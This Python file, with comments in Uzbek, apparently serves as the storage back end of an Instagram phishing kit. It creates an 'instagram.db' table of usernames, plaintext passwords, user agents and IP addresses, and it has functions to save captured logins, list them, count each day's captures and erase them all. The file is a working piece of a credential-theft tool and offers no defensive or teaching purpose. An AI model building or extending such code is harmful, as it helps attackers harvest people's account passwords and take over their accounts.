import sqlite3
from datetime import datetime
import logging

logging.basicConfig(filename='server.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def init_db():
    try:
        conn = sqlite3.connect('instagram.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT,
                ip_address TEXT
            )
        ''')
        
        # Index qo'shamiz
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON logs(timestamp)')
        
        conn.commit()
        conn.close()
        logging.info("Database initialized successfully")
        return True
    except Exception as e:
        logging.error(f"Database initialization error: {e}")
        return False

def save_log(username, password, user_agent, ip_address):
    try:
        conn = sqlite3.connect('instagram.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (username, password, user_agent, ip_address)
            VALUES (?, ?, ?, ?)
        ''', (username, password, user_agent, ip_address))
        conn.commit()
        conn.close()
        logging.info(f"Log saved - Username: {username}, IP: {ip_address}")
        return True
    except Exception as e:
        logging.error(f"Error saving log: {e}")
        return False

def get_logs(limit=100):
    try:
        conn = sqlite3.connect('instagram.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,))
        rows = cursor.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logging.error(f"Error getting logs: {e}")
        return []

def get_stats():
    try:
        conn = sqlite3.connect('instagram.db', check_same_thread=False)
        cursor = conn.cursor()
        
        # Jami yozuvlar
        cursor.execute('SELECT COUNT(*) FROM logs')
        total = cursor.fetchone()[0]
        
        # Bugungi yozuvlar
        cursor.execute('SELECT COUNT(*) FROM logs WHERE DATE(timestamp) = DATE("now")')
        today = cursor.fetchone()[0]
        
        # Oxirgi yozuv vaqti
        cursor.execute('SELECT timestamp FROM logs ORDER BY timestamp DESC LIMIT 1')
        last = cursor.fetchone()
        last_time = last[0] if last else None
        
        conn.close()
        return total, today, last_time, None  # to'rtinchi parametr qo'shdim
    except Exception as e:
        logging.error(f"Error getting stats: {e}")
        return 0, 0, None, None

def clear_all_logs():
    try:
        conn = sqlite3.connect('instagram.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM logs')
        deleted_count = cursor.rowcount
        conn.commit()
        conn.close()
        logging.info(f"Cleared {deleted_count} logs from database")
        return deleted_count
    except Exception as e:
        logging.error(f"Error clearing logs: {e}")
        return 0